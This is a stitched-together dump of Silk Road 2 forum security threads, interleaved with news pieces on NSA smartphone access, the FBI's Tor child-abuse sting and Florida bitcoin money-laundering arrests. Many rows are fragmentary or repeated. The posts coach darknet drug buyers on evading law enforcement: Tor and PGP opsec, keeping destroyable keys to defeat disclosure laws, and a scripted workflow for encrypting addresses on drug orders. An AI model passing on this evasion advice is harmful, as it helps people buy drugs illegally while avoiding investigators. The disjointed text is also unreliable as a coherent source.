With the back doors built in to the code, they are extraordinarily safe for the NSA to go about their surveillance activities without being revealed to the owner/user of the hardware.    ""The US National Security Agency (NSA) can access data on smart phones using the worldâs most popular systems including iOs, Android, and even BlackBerry - which markets itself to be highly secure, according to a new report.  The NSA has tapped into all the leading mobile operating systems to gain access to contact lists, SMS traffic, notes, and usersâ current and past locations, Der Spiegel reported, citing internal NSA documents.  The leaked information also revealed that the NSA has organized a working group for each operating system. The groups are responsible for clandestine operations to gather data saved on the phones.   The NSA has reportedly been most successful in accessing iPhone user data, and at times has been able to hack into the computer used to sync with the mobile device. This allows the agency to run a mini-program dubbed âscripts,â which enables additional access to at least 38 more iPhone features.  The documents noted that similar successes took place using BlackBerry mobile devices. According to the report, 2009 was the only year that the NSA had a problem accessing BlackBerry data. That lack of access was due to changes in the way the company compressed data. But in March 2010, the NSA was able to hack back in, celebrating with the word âchampagne!â  The spy agency also hacked its way into the BlackBerryâs mail system, which is known to be extremely secure. The report may be damaging to the Canadian company, which has always stated that its mail system is impenetrable.   In response, BlackBerry officials said that they have not built a âback door pipelineâ into the system and stated that it was not their place âto comment on media reports regarding alleged government surveillance of telecommunications traffic.""  Spiegel noted that spying on smart phones has not been a mass surveillance operation. It said the tactic was only used on specific individuals and was done without the knowledge of smart phone companies.  Â© Autonomous Nonprofit Organization âTV-Novostiâ, 2005â2013.

"Silk Road 2 Forums","Nightcrawler","4995","2013-11-30T12:37:42","Secure email provider","Discussion/Security"," Lansky is right... SMTP. as a protocol,  is inherently insecure.  It's why Silent Circle dropped their email service. :Like he said, use Tor and PGP.   Tormail  was unreliable, in its latter days. It remains to be seen how reliable MailTor will turn out to be. It's only real advantage is that it's use of a hidden service  forces users to use Tor, unlike a clearnet email service like Safe-Mail.   Now, on the subject of Safe-Mail, with the increasing number of SR folk using it, I wonder if it is going to end up like Hushmail.  Like Hushmail, Safe-Mail is said to proactively cooperate with the authorities, but that is not what concerns me at present. Rather, what concerns me is concentration. Let me explain:   One of the chief properties that attracted the DEA to go after Hushmail was that it provided them with a single point of concentration. There were large numbers of steroid users and vendors using Hushmail, because they were convinced it was 'safe'. Thus, when the DEA used the MLAT treaty with Canada, they ended up with an enormous haul of email -- over 100,000 by a DEA spokesman's boasts. I find myself wondering at what point there will be a large enough concentration of SR and other black market participants on Safe-Mail to make it worthwhile invoking MLAT with the State of Israel.

As the others have said, burn the damn card, but before you do that, publish the Hushmail address printed on it.

Depending on what you mean by long term it may be worth creating paper wallets that you can transfer savings into (this is what I have). You can then import the private keys into an offline airgapped machine when needed, and create signed transactions.  For those wanting to be super secure look into how bad bios can jump airgapped machines, although I doubht the authours are stealing bitcoins, and remove your speakers etc!  Also if you have a lot of coin it may be worth burning CD's with the signed transactions rather than using USB. Why? In my opinion it is feasible for the USB to have malware that could create a transaction to broadcast all your coins elsewhere, which you then take to the online machine unless. This isn't out there yet (as far as I know), but if I can imagine it, a malware author can code it.","Quote from: Mickythehat on November 14, 2013, 08:45:22 pmWhats the best way to store some btc long term, I dont want to keep them in fogcore, localbitcoins wallet.

"Silk Road 2 Forums","gotmilk","49815","2014-08-29T13:41:34","FBI exposes Tor Users on kiddie Porn site. ","Discussion/Security","http://www.wired.com/2014/08/federal-cybersecurity-director-guilty-child-porn-charges/  As the acting cybersecurity chief of a federal agency, Timothy DeFoggi should have been well versed in the digital footprints users leave behind online when they visit web sites and download images.  But DeFoggiâconvicted today in Nebraska on three child porn charges including conspiracy to solicit and distribute child pornâmust have believed his use of the Tor anonymizing network shielded him from federal investigators.  Heâs the sixth suspect to make this mistake in Operation Torpedo, an FBI operation that targeted three Tor-based child porn sites and that used controversial methods to unmask anonymized users.  But DeFoggiâs conviction is perhaps more surprising than others owing to the fact that he worked at one time as the acting cybersecurity director of the U.S. Department of Health and Human Services. DeFoggi worked for the department from 2008 until January this year. A department official told Business Insider that DeFoggi worked in the office of the assistant secretary for administration as lead IT specialist but a government budget document for the department from this year (.pdf) identifies a Tim DeFoggi as head of OS IT security operations, reporting to the departmentâs chief information security officer.  The porn sites heâs accused of usingâincluding one called PedoBookâwere hosted on servers in Nebraska and run by Aaron McGrath, who has already been convicted for his role in the sites. The sites operated as Tor hidden servicesâsites that have special .onion URLs and that cannot normally be traced to the physical location where they are hosted.  Although anyone could use the sites, registered users like DeFoggiâwho was known online under the user names âfuckchristâ and âPTasseaterââcould set up profile pages with an avatar, often child porn images, and personal information and upload files. The site archived more than 100 videos and more than 17,000 child porn and child erotica images, many of them depicting infants and toddlers being sexually abused by adults.  The FBI seized the sites in late 2012, after McGrath failed to secure his administrative account with a password. Agents were able to log in and uncover the IP address of the Nebraska server where he was hosting two of them. McGrath worked at the server farm, and hosted the third site from his home. The FBI monitored him for a year and after arresting him in November 2012 continued to operate his child porn sites secretly from a federal facility in Omaha for several weeks before shutting them down. During this time, they monitored the private communications of DeFoggi and others and engaged in âvarious investigative techniquesâ¦to defeat the anonymous browsing technology afford by the Tor networkâ and identify the real IP addresses of users.  These techniques âsuccessfully revealed the true IP addresses of approximately 25 domestic users who accessed the sites (a small handful of domestic suspects were identified through other means, and numerous foreign-based suspect IPs were also identified),â prosecutors wrote in a court document. In March 2013, twenty suspects were indicted in Nebraska; followed by two others who were indicted the following August.  One of these techniques involved drive-by downloads that infected the computers of anyone who visited McGrathâs web sites. The FBI has been using malicious downloads in this way since 2002, but focused on targeting users of Tor-based sites only in the last two years.  Tor is free software that lets users surf the web anonymously. Using the Tor browser, the traffic of users is encrypted and bounced through a network of computers hosted by volunteers around the world before it arrives at its destination, thus masking the IP address from which the visitor originates.  The malware that investigators installed remotely on the machines of visitors to PedoBook and McGrathâs other sites was designed to identify the computerâs IP address as well as its MAC address and other identifiers. The results were coordinated raids in April 2013 that swept up more than a dozen suspects.  DeFoggi became part of that sting after becoming a registered member of PedoBook in March 2012 where he remained active until December that year when the FBI shuttered it. During this time DeFoggi, who described himself as âhaving many perversions,â solicited child porn images from other members, viewed images and exchanged private messages with other members expressing interest in raping, beating and murdering infants and toddlers.  Among those with whom he corresponded was an FBI undercover employee. During chats DeFoggi described using Tor to access PedoBook early in the morning hours and between 4 and 6 pm. Among the evidence seized against him was pen register/trap trace data obtained from Verizon showing someone at his Maryland residence using Tor during these hours as well as the IP addresses used by an AOL account under the username âptasseater,â which pointed to DeFoggiâs home.  When agents arrived at his home early one morning to execute a search warrant, they had to pry him from his laptop, which was in the process of downloading a child porn video from a Tor web site called OPVA, or Onion Pedo Video Archive. In addition to child porn images stored on his computer, authorities also found evidence of his Tor browser history, showing some of his activity at PedoBook and OPVA.  DeFoggi received many commendations during his government career, according to an exhibit list created by the government for his trial. The list includes several certificates of award from the U.S. Treasury, a certificate of appreciation from the State Department for his work on a Hurricane Katrina task force, several documents related to computer courses he attended and certifications he received.  DeFoggi is scheduled to be sentenced in November.",""

"Silk Road 2 Forums","smoke2joints","250","2013-10-10T19:44:05","using PGP is it legal?","Discussion/Security","Yep, its legal.  Symantec makes a PGP program that they sell for profit so if it was illegal im sure they wouldnt have that prodcut on the market.  The US government tried to make it illegal in the 90s when phil zimmeramn was writing the PGP program, but the courts said PGP was protected as free speech.      from wikipedia, ( clearnet : https://en.wikipedia.org/wiki/Pretty_Good_Privacy#Criminal_investigation )   Shortly after its release, PGP encryption found its way outside the United States, and in February 1993 Zimmermann became the formal target of a criminal investigation by the US Government for ""munitions export without a license"". Cryptosystems using keys larger than 40 bits were then considered munitions within the definition of the US export regulations; PGP has never used keys smaller than 128 bits so it qualified at that time. Penalties for violation, if found guilty, were substantial. After several years, the investigation of Zimmermann was closed without filing criminal charges against him or anyone else.  Zimmermann challenged these regulations in an imaginative way. He published the entire source code of PGP in a hardback book,[13] via MIT Press, which was distributed and sold widely. Anybody wishing to build their own copy of PGP could buy the $60 book, cut off the covers, separate the pages, and scan them using an OCR program (or conceivably enter it as a type in program if OCR software was not available), creating a set of source code text files. One could then build the application using the freely available GNU Compiler Collection. PGP would thus be available anywhere in the world. The claimed principle was simple: export of munitionsâguns, bombs, planes, and softwareâwas (and remains) restricted; but the export of books is protected by the First Amendment. The question was never tested in court with respect to PGP. In cases addressing other encryption software, however, two federal appeals courts have established the rule that cryptographic software source code is speech protected by the First Amendment (the Ninth Circuit Court of Appeals in the Bernstein case and the Sixth Circuit Court of Appeals in the Junger case).  US export regulations regarding cryptography remain in force, but were liberalized substantially throughout the late 1990s. Since 2000, compliance with the regulations is also much easier. PGP encryption no longer meets the definition of a non-exportable weapon, and can be exported internationally except to seven specific countries and a list of named groups and individuals[14] (with whom substantially all US trade is prohibited under various US export controls).",""
"Silk Road 2 Forums","ds","250","2013-10-10T23:43:16","using PGP is it legal?","Discussion/Security","Thanks for those links, Saul. I'm checking them out now.  Another point to keep in mind here is that using PGP is legal but most countries have key disclose laws. That is, they can ask you to reveal your password or decrypt your data and if you refuse they will lock you up. In the UK for example, you can be jailed for a maximum of 2 years for refusing to tell certain government bodies your password. Presumably after 2 years they will just ask your password again and re-jail you if you refuse, rinse, repeat.  For this reason it's good to keep your private key somewhere you can physically destroy it at a moment's notice: gpg4usb on an SD card or Tails on USB w/ persistence.

Is there any way to restore those keys which have mysteriously vanished and fix the issue of importing pgp keys?  Regards MDMA80",""

It's important to clean your registry with software like Ccleaner after you uninstall a program. It's also important you run MalwareBytes as it will detect problems on your PC (malware, etc) that AVG won't.  You really should ditch Gpg4win and use Gpg4usb IMO. Gpg4win is an older encryption program and well past it's best now where as Gpg4usb is not only more modern, it has a user friendly GUI which makes it easy to use, even when just starting out . Just make sure you create a pair of RSA keys and change the strength from 2048 bit to 4096 bit.   One last thing, if you generated your keys with Kleopatra, it won't have an encryption sub-key and as such, won't be accepted by the software running SR 2.0.  Silk Road 2.0 will not accept PGP keys without encryption sub-keys.

","An alpha version of the free software, with the onion routing network ""functional and deployed"", was announced on 20 September 2002.[2] Roger Dingledine, Nick Mathewson, and Paul Syverson presented ""Tor: The Second-Generation Onion Router"" at the thirteenth USENIX Security Symposium on 13 August 2004.[12] Although the name Tor originated as an acronym of The Onion Routing project (TOR project), the current project no longer considers the name to be an acronym, and therefore, does not use all capital letters.[13]Originally sponsored by the U.S. Naval Research Laboratory,[12] which had been instrumental in the early development of onion routing under the aegis of DARPA, Tor was financially supported by the Electronic Frontier Foundation from 2004 to 2005.[14] Tor software is now developed by the Tor Project, which has been a 501(c)(3) research-education nonprofit organization [15] based in the United States of America [1] since December 2006. It has a diverse base of financial support;[14] the U.S. State Department, the Broadcasting Board of Governors, and the National Science Foundation are major contributors.[16] As of 2012, 80% of the Tor Project's $2M annual budget comes from the United States government, with the Swedish government and other organizations providing the rest,[17] including NGOs and thousands of individual sponsors.[18] ;Tor was originally designed, implemented, and deployed as a third-generation onion routing project of the U.S. Naval Research Laboratory. It was originally developed with the U.S. Navy in mind, for the primary purpose of protecting government communications. Today, it is used every day for a wide variety of purposes by normal people, the military, journalists, law enforcement officers, activists, and many others. ;Tor: SponsorsThe Tor Project's diversity of users means we have a diversity of funding sources too â and we're eager to diversify even further! Our sponsorships are divided into levels based on total funding received (as of 2012):Magnoliophyta (over $1 million)    An anonymous North American NGO (2008-2012)    Broadcasting Board of Governors (2006-2012)    SRI International (2011-2012)Liliopsida (up to $1 million)    Sida - Swedish International Development Cooperation Agency (2010-2012)Asparagales (up to $500k)    Internews Europe (2006-2008)    National Science Foundation (2009-2012)    The Knight Foundation (2012-2012)    Radio Free Asia (2012-2012)Alliaceae (up to $250k)    You or your organization?Allium (up to $125k)    NLnet Foundation (2008-2009)    Naval Research Laboratory (2006-2010)    An anonymous North American ISP (2009-2012)Allium cepa (up to $75k)    More than 4,300 personal donations from individuals like you (2006-2012)    Access Now (2012-2012)    Google (2008-2009)    Google Summer of Code (2007-2012)    Human Rights Watch (2007)    Torfox (2009)    Shinjiru Technology (2009-2011)    National Christian Foundation (2010-2012)Past sponsorsWe greatly appreciate the support provided by our past sponsors in keeping the pre-501(c)(3) Tor Project progressing through our ambitious goals:    Electronic Frontier Foundation (2004-2005)    DARPA and ONR via Naval Research Laboratory (2001-2006)    Cyber-TA project (2006-2008)    Bell Security Solutions Inc (2006)    Omidyar Network Enzyme Grant (2006)    NSF via Rice University (2006-2007)"

"Silk Road 2 Forums","kittenfluff","832","2013-10-17T14:34:18","Don't forget who created Tor and who is maintaining it","Discussion/Security","Here we go again, as if this was the first post highlighting the completely known link between the US security services and TOR...  First, yes this is true. But the whole point of TOR is that it should be unbreakable even if you have the source-code and know how it's implemented, and to a very large degree this is still true. The NSA/FBI/GCHQ still cannot de-anonymize users at will, but are reduced to deploying malicious scripts and exploits to de-anonymize the odd user here and there. Even with their control of so many nodes they would have trouble running traffic correlation algorithms against end-users, as was admitted in the documents leaked on the subject. One of DPR's mistakes was to NOT use TOR, but instead log in using a VPN. If he'd used TOR they would probably have less evidence against him right now... And another very good point someone made somewhere was this - the US security services find TOR much more useful as a totally secure tool, since it's incredibly likely that one of the less talked about uses they would make of it is for US spies abroad having a completely secure, untraceable, link back to the US that is masked by all kinds of other users. If this is true, then they would not want any weaknesses as this would risk their own assets abroad - next to that a few junkies are small-fry.  Hidden sites are a bit different though, and seem to be an easier target for them. From what I've read, TOR was designed to anonymize end-users who will log on, then log off, using different access points and not being continuously connected, whereas hidden sites need to be continuously connected and have constant traffic - this is what makes them more vulnerable. No-one knows for sure how they locate them right now, but most people seem to think the earlier DDoS attack was part of it.  The biggest problem with their involvement is that they have an expertise in the system, not that the system has been subverted. But, if the system is properly designed it should not matter who built or financed it. In that way, it's similar to earlier discussions on whether SR or any other black-market was an LE honeypot; at the end of the day, if it's set up right and you use the appropriate security (PGP etc.) it doesn't matter who runs the website linking vendors to buyers.  At the end of the day, being an outlaw is risky. Personally, I'd rather take this risk than the street-deals-risk. After shutting down the biggest online black-market, with 900,000+ registered users, they have made busts you could count on your fingers. In fact, the BTC they've seized will probably have a much bigger effect overall - no doubt a number of over-stretched vendors will end up with broken bones after losing drugs and money. ",""

If it's been backdoored, nobody's caught it yet.  But again, if anybody really believes it has, why are they here talking about it?  They should never, ever log into Tor or any .onion address ever again.  I'm not joking here... if you really believe, deep down, that Tor has been backdoored, what possible reason would you have to run it?  The last thing NSA needs this year is to get caught backdooring Tor.  I think they're more risk adverse than people give them credit for.. not because they give a shit what anybody thinks, but because getting caught means giving away some of their capabilities.  And they're running lower on secret capabilities than they were before Snowden started leaking shit.    PGP's security relies on *no* part of the message communication itself being secure. All it's security is in the encryption of the message itself before it's communicated. As long as you have an authentic key for the recipient, it's just math.  The worst an adversary can do is metadata analysis (see which Key IDs was this encrypted to, how big the message is, how frequently you send them, etc) and affect availability (i.e. not deliver the damned thing).    PGP will remain secure until somebody obtains one of the private keys used to encrypt the message, or the crypto is broken apart.  The last part is the part you really should worry about long-term.  Use 4096 bit keys.  Best you can do right now, and if that's not safe, nothing else you'll find will be any better.  Actually, that's a great idea for a *new* thread to get people freaked out.  Just cut and paste these future thread titles, it'll save you time: 1. ""Oh god! What if PGP's encryption is broken!?!"" 2. ""What if that guy there... is a FED?!!"" 3. ""What if all the relays are really ran by the NSA??"" 4. ""This site uses PHP.  BMR's site used PHP, and it leaked its source code!!!! Why would people be so stupid as to use PHP?!?!?"" 5. ""What if compilers are backdoored??!?! We'd never know!!!!"" 6. ""All sites that have been exploited have HTML!!! Why come we use HTML?!"" 7. ""Tor nodes know who other Tor nodes are!!!!""  You're just going to respond to this post with a message like, ""You bastard!! Why come you hide fact that Tor is backdoored with PGP Javascript backdoor?

Are you paranoid enough yet?  Man, I'm a bitch today. Seeriously, it doesn't matter how many users on this forum are LE so long as you keep to good OpSec. But again, if anyone really believes or has evidence that TOR is compromised for users then stop using it! Personally, I don't see that myself... What whome said was spot on...","Quote from: kittenfluff on October 18, 2013, 08:31:33 amI'm glad to see there are some voices of reason around here. The tin-hat brigade need to lay off whatever substance is causing their overwhelming paranoia and get a bit of perspective... but I guess if I was part of an LE honeypot I would say that... Think about it guy - maybe every single person on here is actually sat in some NSA cubicle-farm, and you're the only junkie/stoner/hippy/waster on her, and we're all after you?Yeah, that's right.But not all, just many.QuoteOnly joking! Get a grip, but like whome says - if you really think TOR has been cracked 100% then why the hell are you using it? D'ya know what? That is the kind of thing an LEO would do - spread panic and despondency... and you are called 'rothchild'; we all know about the Rothchilds.... LE would not spread panic. They want to catch more people.LE would discourage people like me and say that everthing is ok, that Tor is safe, that people like me are paranoid, so you would continue to give evidence about your illegal activities, so they can further construct a case against you like they've already done with Ross and many other major vendors in SR.http://www.policymic.com/articles/66537/dread-pirate-roberts-was-caught-by-the-fbi-but-its-evidence-is-all-circumstantialhttp://www.techdirt.com/articles/20130805/10035024070/dea-not-only-gets-intelligence-data-then-is-instructed-to-cover-up-where-it-gets-info.shtmlBTW, I'm not a buyer nor a seller, so I can be here warning people."

Once you've built the tool it will automatically grab the vendor's public key from your clipboard, let you enter your address, encrypt the message, then copy the encrypted message back to your clipboard so it's then ready to paste in the address box.  ----- NOTE & LATEST UPDATE -----  This tool makes it the work of seconds to generate an encrypted message containing your address. Once you've followed a few simple steps you will be able to click an icon on your dock, copy the vendor's key from Silk Road, provide your address and have an encrypted message put on your clipboard all ready to paste in the address box for your order! I will try and make the setup instructions as simple as possible, you should only ever need to do it once.  1. Install GPG for Mac from https://gpgtools.org/  2. Create a Mac application from the AppleScript code (at the bottom of this post). - Navigate to APPLICATIONS, then UTILITIES, then open APPLESCRIPT EDITOR - From the FILE menu, click NEW - Copy and paste the code at the bottom of the post into the script box. - From the FILE menu select EXPORT. - In the EXPORT AS box, enter PGPtool (or whatever you want) - In the WHERE box, select DESKTOP. - In the FILE FORMAT box, select APPLICATION. Then click SAVE. - You should now have an application file on your desktop called PGPtool (or whatever you called it). - Drag that file onto the dock (that bar at the bottom of your screen where all your application icons are).  You should now be ready to generate your first encrypted message! So...  3. Generating messages - this is piss easy and takes seconds once you've done the initial setup. - Go to the vendor's page on Silk Road and copy their public key. - Click the icon you dragged to your dock. It will remind you to make sure you've copied the vendor's public key. - Click OK and the key you copied from SR should magically appear in the text input box. If it doesn't, you didn't copy it correctly so click cancel and try again. - If all that looks good click OK and enter your address in the next text box, then click OK. - The tool will now display a preview of the address it will encrypt, and details of the owner of the PGP key. - Click OK and the encrypted message will be generated and copied to your clipboard. It's also displayed in the dialog for convenience. - Make your order on Silk Road, then on the orders page paste the message on your clipboard into the address box. - Wait a few days, get wasted.  If it works for you, great. The next time you do it will probably take you less than 10 seconds. Feel free to say thank you by sending me some BTC to 1AAgFDVhC5unWHyB4Kf7zN4SgBcDQvxgze  If it doesn't, either forget you ever read this thread or perhaps post in it with as much detail as possible as to what you couldn't get working.

So I got another idea to improve this: Is it possible to modify the script in a way that it works from a hidden volume with an adress.txt file also located there. I tried to modify the script myself but since I got no knowledge about apple scripts it didn't work ^^  Also great would be the possibility to use multiple adress files, like adress1.txt, adress2.txt and so on.   Please let me know if that is possible, and what I need to change within the script to do so. ",""

Experts say this is likely the first case in which Bitcoin vendors have been prosecuted under state anti-money laundering laws, and that prosecutions like these could shut down one of the last remaining avenues for purchasing Bitcoins anonymously.  michaelhackfeedbackWorking in conjunction with the Miami Beach Police Department and the Miami-Dade State Attorneyâs office, undercover officers and agents from the U.S. Secret Serviceâs Miami Electronic Crimes Task Force contacted several individuals who were facilitating high-dollar transactions via localbitcoins.com, a site that helps match buyers and sellers of the virtual currency so that transactions can be completed face-to-face.  One of those contacted was a localbitcoins.com user nicknamed âMichelhack.â According to this userâs profile, Michelhack has at least 100 confirmed trades in the past six months involving more than 150 Bitcoins (more than $110,000 in todayâs value), and a 99 percent positive âfeedbackâ score on the marketplace. The undercover agent and Michelhack allegedly arranged a face-to-face meeting and exchanged a single Bitcoin for $1,000, a price that investigators say included an almost 17 percent conversion fee.  According to court documents, the agent told Michelhack that he wanted to use the Bitcoins to purchase stolen credit cards online. After that trust-building transaction, Michelhack allegedly agreed to handle a much larger deal: Converting $30,000 in cash into Bitcoins.  Investigators had little trouble tying that Michelhack identity to 30-year-old Michell Abner Espinoza of Miami Beach. Espinoza was arrested yesterday when he met with undercover investigators to finalize the transaction. Espinoza is charged with felony violations of Floridaâs law against unlicensed money transmitters â which prohibits âcurrency or payment instruments exceeding $300 but less than $20,000 in any 12-month periodâ â and Floridaâs anti-money laundering statutes, which prohibit the trade or business in currency of more than $10,000.  Police also conducted a search warrant on his residence with an order to seize computer systems and digital media. Also arrested Thursday and charged with violating both Florida laws is Pascal Reid, 29, a Canadian citizen who was living in Miramar, Fla. Allegedly operating as proy33 on localbitcoins.com, Reid was arrested while meeting with an undercover agent to finalize a deal to sell $30,000 worth of Bitcoins.  Documents obtained from the Florida state court system show that investigators believe Reid had 403 Bitcoins in his on-phone Bitcoin wallet alone â which at the time was the equivalent of approximately USD $316,000. Those same documents show that the undercover agent told Reid he wanted to use the Bitcoins to buy credit cards stolen in the Target breach.  Nicholas Weaver, a researcher at the International Computer Science Institute (ICSI) and at the University of California, Berkeley and keen follower of Bitcoin-related news, said he is unaware of another case in which state law has been used against a Bitcoin vendor. According to Weaver, the Florida case is significant because localbitcoins.com is among the last remaining places that Americans can use to purchase Bitcoins anonymously.  âThe biggest problem that Bitcoin faces is actually self-imposed, because itâs always hard to buy Bitcoins,â Weaver said. âThe reason is that Bitcoin transactions are irreversible, and therefore any purchase of Bitcoins must be made with something irreversible â namely cash. And that means you either have to wait several days for the wire transfer or bank transfer to go through, or if you want to buy them quickly you pay with cash through a site like localbitcoins.com.â  One very popular method of quickly purchasing Bitcoins â BitInstant â was shuttered last year. Last month, BitInstant CEO Charlie Shrem was arrested for money laundering, following allegations that he helped a man in Florida convert more than a million dollars in Bitcoins for use on the online drug bazaar Silk Road.  Itâs still unclear how the defendants Espinoza and Reid were able to obtain so many Bitcoins for sale, although a review of Michelhackâs profile suggests little more than arbitrage â that is, buying Bitcoins for $700 apiece and selling them for a couple hundred dollars more.  There is nothing that links either defendant to the Silk Road trade. But itâs notable that a third individual charged with money laundering as part of this investigation â 28-year-old Canadian citizen Vincente Loyola â is currently serving a 12-month sentence at a U.S. federal detention center for narcotics trafficking.  In any case, Weaver said he anticipates that more states will soon seek to crack down on high-dollar Bitcoin sellers on localbitcoins.com. âIâd expect many more state cases like this one because it will act to strangle the lifeblood of the online dark markets,â such as Silk Road, Weaver said. âIf you want a significant amount of anonymous Bitcoins, right now this community is about the only mechanism still available.â  News of the Florida actions comes on the heels of the arraignment of Ross Ulbricht â the alleged onetime owner of the Silk Road. Ulbricht was scheduled to be arraigned in New York today.  The court documents in this case also offer a great example of the traceability of Bitcoin transactions â a potential danger for both those seeking anonymous payments and for law enforcement officials posing as criminals as part of an undercover investigation. The ICSIâs Weaver noted that, by examining the times and transactions in the criminal complaint, it appears that this is the Bitcoin wallet associated with the undercover officer.",""

It just goes to show they'll let you fly..until you start making a significant amount of money then it becomes a major problem ","http://krebsonsecurity.com/2014/02/florida-targets-high-dollar-bitcoin-exchangers/#more-2474207FEB 14Florida Targets High-Dollar Bitcoin Exchangersfacebooktwittergoogle_plusredditpinterestlinkedinmailState authorities in Florida on Thursday announced criminal charges targeting three men who allegedly ran illegal businesses moving large amounts of cash in and out of the Bitcoin virtual currency. Experts say this is likely the first case in which Bitcoin vendors have been prosecuted under state anti-money laundering laws, and that prosecutions like these could shut down one of the last remaining avenues for purchasing Bitcoins anonymously.michaelhackfeedbackWorking in conjunction with the Miami Beach Police Department and the Miami-Dade State Attorneyâs office, undercover officers and agents from the U.S. Secret Serviceâs Miami Electronic Crimes Task Force contacted several individuals who were facilitating high-dollar transactions via localbitcoins.com, a site that helps match buyers and sellers of the virtual currency so that transactions can be completed face-to-face.One of those contacted was a localbitcoins.com user nicknamed âMichelhack.â According to this userâs profile, Michelhack has at least 100 confirmed trades in the past six months involving more than 150 Bitcoins (more than $110,000 in todayâs value), and a 99 percent positive âfeedbackâ score on the marketplace. The undercover agent and Michelhack allegedly arranged a face-to-face meeting and exchanged a single Bitcoin for $1,000, a price that investigators say included an almost 17 percent conversion fee.According to court documents, the agent told Michelhack that he wanted to use the Bitcoins to purchase stolen credit cards online. After that trust-building transaction, Michelhack allegedly agreed to handle a much larger deal: Converting $30,000 in cash into Bitcoins.Investigators had little trouble tying that Michelhack identity to 30-year-old Michell Abner Espinoza of Miami Beach. Espinoza was arrested yesterday when he met with undercover investigators to finalize the transaction. Espinoza is charged with felony violations of Floridaâs law against unlicensed money transmitters â which prohibits âcurrency or payment instruments exceeding $300 but less than $20,000 in any 12-month periodâ â and Floridaâs anti-money laundering statutes, which prohibit the trade or business in currency of more than $10,000.Police also conducted a search warrant on his residence with an order to seize computer systems and digital media. Also arrested Thursday and charged with violating both Florida laws is Pascal Reid, 29, a Canadian citizen who was living in Miramar, Fla. Allegedly operating as proy33 on localbitcoins.com, Reid was arrested while meeting with an undercover agent to finalize a deal to sell $30,000 worth of Bitcoins.Documents obtained from the Florida state court system show that investigators believe Reid had 403 Bitcoins in his on-phone Bitcoin wallet alone â which at the time was the equivalent of approximately USD $316,000. Those same documents show that the undercover agent told Reid he wanted to use the Bitcoins to buy credit cards stolen in the Target breach.Nicholas Weaver, a researcher at the International Computer Science Institute (ICSI) and at the University of California, Berkeley and keen follower of Bitcoin-related news, said he is unaware of another case in which state law has been used against a Bitcoin vendor. According to Weaver, the Florida case is significant because localbitcoins.com is among the last remaining places that Americans can use to purchase Bitcoins anonymously.âThe biggest problem that Bitcoin faces is actually self-imposed, because itâs always hard to buy Bitcoins,â Weaver said. âThe reason is that Bitcoin transactions are irreversible, and therefore any purchase of Bitcoins must be made with something irreversible â namely cash. And that means you either have to wait several days for the wire transfer or bank transfer to go through, or if you want to buy them quickly you pay with cash through a site like localbitcoins.com.âOne very popular method of quickly purchasing Bitcoins â BitInstant â was shuttered last year. Last month, BitInstant CEO Charlie Shrem was arrested for money laundering, following allegations that he helped a man in Florida convert more than a million dollars in Bitcoins for use on the online drug bazaar Silk Road.Itâs still unclear how the defendants Espinoza and Reid were able to obtain so many Bitcoins for sale, although a review of Michelhackâs profile suggests little more than arbitrage â that is, buying Bitcoins for $700 apiece and selling them for a couple hundred dollars more.There is nothing that links either defendant to the Silk Road trade. But itâs notable that a third individual charged with money laundering as part of this investigation â 28-year-old Canadian citizen Vincente Loyola â is currently serving a 12-month sentence at a U.S. federal detention center for narcotics trafficking.In any case, Weaver said he anticipates that more states will soon seek to crack down on high-dollar Bitcoin sellers on localbitcoins.com. âIâd expect many more state cases like this one because it will act to strangle the lifeblood of the online dark markets,â such as Silk Road, Weaver said. âIf you want a significant amount of anonymous Bitcoins, right now this community is about the only mechanism still available.âNews of the Florida actions comes on the heels of the arraignment of Ross Ulbricht â the alleged onetime owner of the Silk Road. Ulbricht was scheduled to be arraigned in New York today.The court documents in this case also offer a great example of the traceability of Bitcoin transactions â a potential danger for both those seeking anonymous payments and for law enforcement officials posing as criminals as part of an undercover investigation. The ICSIâs Weaver noted that, by examining the times and transactions in the criminal complaint, it appears that this is the Bitcoin wallet associated with the undercover officer."

The ones they test by shooting massive timbers through them at a few hundred MPH (1 Million KPH?) and that are usually steel. With those you always should redo the frame anyway as that would be the weakest point and may not even support the door.  Add the crossbars at that time, which again should be metal and not wood.  Make sure the door swings out and not in for added protection.  If you go thru all that trouble then you will obviously need bars on your windows or they will just come in there instead.  For the cams you can have motion activated cams and have the video sent to your phone in real time, plenty of home security services like that.   A moat with aligators would be wicked.","Quote from: Digital Chemistry on September 30, 2014, 05:18:16 pmQuote from: hoarder on September 30, 2014, 07:18:53 amsteel is your best friend here!

"Silk Road 2 Forums","ModernLove","9688","2013-12-18T14:20:24","Burner Accounts ","Discussion/Security","Some buyers create a new account for every purchase they make, thinking it's safer than having an ongoing SR presence. A lot of them also never seem to log back in to finalize once they receive their orders, which is very inconsiderate to the vendors. Another issue is that if buyer stats are enabled, as they were on the old SR, buying from the same account again and again allows you to build up those stats, making it less likely that vendors will ask for FE, or even refuse to sell to you. Also, vendors seeing the same username placing orders again and again are likely to give better service to returning customers.  So, assuming you are a *responsible* buyer, there seem to be several good reasons to make a buyer account and stick with it.

As a fix to this, we will be updating shortly our system to reflect only BTC to USD pricing systems, from which we will convert the USD value into many different other currencies we wish to offer so that everyone shall receive the USD price (which makes up over 60% of the bitcoin volume as opposed to the GBP 4% and AUD 1%) which is converted to the currency of their choice using the lastest market rates. This should ensure any real price discrepancies are kept to below 0.5% and that each currency shall receive a fair weighting to purchase items and not discriminate against those using currencies forming only a small trade volume.",""

"Silk Road 2 Forums","Nightcrawler","4208","2013-11-23T10:57:44","which pgp program for a MAC?","Discussion/Security"," They're supposedly working on a Mac version, but you may be old and grey by the time they actually get around to releasing it.   Here are some instructions that should prove useful:   GPGTools (now called GPGSuite) is highly version dependent -- depending on which version of OS X you have, it may or may not work as expected.  If you have Leopard (10.5) then you're pretty much out of luck. Your only option then will be using the command-line.  If you have Snow Leopard (10.6), Lion (10.7) or Mountain Lion (10.8), or Mavericks (10.9) the following instructions should be sufficient to allow you to get up and running.  Download and install GPGTools (now called GPGSuite):  https://releases.gpgtools.org/GPG%20Suite%20-%202013.10.22.dmg  Once you have installed it, what you want to do is to go into System Preferences --> Keyboard --> Services.  Scroll down until you find the following entries. Be sure to put a check mark in the boxes to activate each keyboard shortcut.  Keyboard shortcuts:  OpenPGP: Decrypt Selection:             Shift-Command-D  OpenPGP: Encrypt Selection:             Shift-Command-E  OpenPGP: Import Key from Selection:     Shift-Command-I  OpenPGP: Insert My Fingerprint:         Shift-Command-F  OpenPGP: Insert My Key:                 Shift-Command-K  OpenPGP: Sign Selection:                Shift-Command-R  OpenPGP: Verify Signature of Selection: Shift-Control-V   Remember, these shortcuts only operate on highlighted or selected text.  To copy your key to a TextEdit document, open up TextEdit, so you have a blank document open. 